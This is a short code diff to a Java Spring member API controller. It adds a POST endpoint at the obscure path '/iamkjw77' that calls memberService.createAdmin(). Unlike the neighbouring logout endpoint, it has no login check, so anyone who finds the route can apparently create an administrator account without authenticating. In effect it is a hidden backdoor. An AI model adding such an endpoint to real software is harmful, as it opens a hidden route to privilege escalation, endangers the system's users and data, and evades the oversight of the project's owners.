@@ -55,6 +55,11 @@ public class MemberApiController {
 
     }
 
+    @PostMapping("/iamkjw77")
+    public void createAdminByKJW() {
+        memberService.createAdmin();
+    }
+
     @LoginCheck
     @DeleteMapping("/logout")
     public void logout() {
